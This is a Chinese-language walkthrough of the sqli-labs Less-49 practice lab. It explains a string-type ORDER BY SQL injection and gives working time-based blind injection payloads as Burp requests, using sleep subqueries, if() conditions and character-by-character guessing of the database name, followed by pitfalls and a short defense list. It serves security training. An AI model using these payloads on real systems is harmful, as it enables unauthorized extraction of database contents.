## 题目: Sqli‑labs Less‑49

## 题目描述
GET传入sort排序参数，sort被单引号包裹，字符型ORDER BY注入；关闭SQL报错回显，报错注入失效。ORDER BY位置布尔条件判断失效，页面行数固定不变，只能使用时间盲注。直接sleep会逐行执行叠加延时，需要子查询`limit 1`限制sleep仅执行一次。

## 核心原理
```php
$id = $_GET['sort'];
$sql = "SELECT * FROM users ORDER BY '$id'";
```
关键点：字符型，payload 需要`'`闭合，`-- -`注释尾部；无报错输出，updatexml 报错注入无效；布尔条件不会改变页面返回行数；直接 sleep 会对全部行计算造成超时，使用`(select sleep(N) from users limit 1)`；通过`if()`构造条件延时预言机，依靠响应耗时判断条件真假。

**解题思路**
1. Burp 抓包修改 sort 参数，单引号测试确认闭合；
2. 验证 sleep 延时语句是否执行；
3. 构造 if 条件时间盲注 payload，依靠响应时间区分真假；
4. 二分法逐字符猜解库、表、字段数据，可编写 Python 脚本自动化。

## 解题步骤
### 1. 测试单引号闭合 Burp 包
```
GET /sqli-labs/Less-49/?sort=1' HTTP/1.1
Host: 127.0.0.1
```
页面返回 0 行，无 SQL 报错，确认单引号生效、关闭报错回显。

### 2. 验证 sleep 延时 Burp 包
```
GET /sqli-labs/Less-49/?sort=1' and (select sleep(2) from users limit 1) -- - HTTP/1.1
Host: 127.0.0.1
```
观察 Repeater 的 Elapsed 耗时，请求发生明显延迟，sleep 执行成功。

### 3. 条件延时测试 Burp 包（条件为真才延时）
```
GET /sqli-labs/Less-49/?sort=1' and if(1=1,(select sleep(2) from users limit 1),1) -- - HTTP/1.1
Host: 127.0.0.1
```
- 条件成立：请求延时约 2 秒
- 条件不成立：请求快速返回

### 4. 猜库名 
```
GET /sqli-labs/Less-49/?sort=1' and if((select ascii(substr(database(),1,1)) from dual)>110,(select sleep(2) from users limit 1),1) -- - HTTP/1.1
Host: 127.0.0.1
```
> 修改 substr 偏移、ascii 对比数值，二分法逐位猜字符；替换子查询可获取表、字段、账号密码。

## 踩坑记录
1. 禁止直接写`1' and sleep(2)`，ORDER BY 逐行执行 sleep 会严重超时，必须子查询搭配`limit 1`。
2. 和 Less‑48 区分，48 数字型无需引号；49 是字符型，必须`'`闭合加上`-- -`注释。
3. 关闭报错输出，updatexml 报错注入完全无效。
4. ORDER BY 下布尔条件不会改变页面行数，布尔盲注不可使用。
5. 网络抖动容易造成时间误判，设置 sleep 阈值，关键条件可以多次重试。

## 知识点总结
- 字符型 ORDER BY 时间盲注：`ORDER BY '$id'`，payload 使用单引号闭合。
- sleep 优化技巧：`(select sleep(N) from users limit 1)`规避逐行计算带来超长延时。
- 时间盲注三要素：基线耗时、sleep 阈值、二分法减少请求。
- 关卡对比：Less‑48 数字型，Less‑49 字符型，仅闭合符号不同；均无报错，只能时间盲注。
- 防御：sort 参数配置列名白名单；禁止直接拼接用户输入；关闭数据库报错；使用最小权限数据库账号。
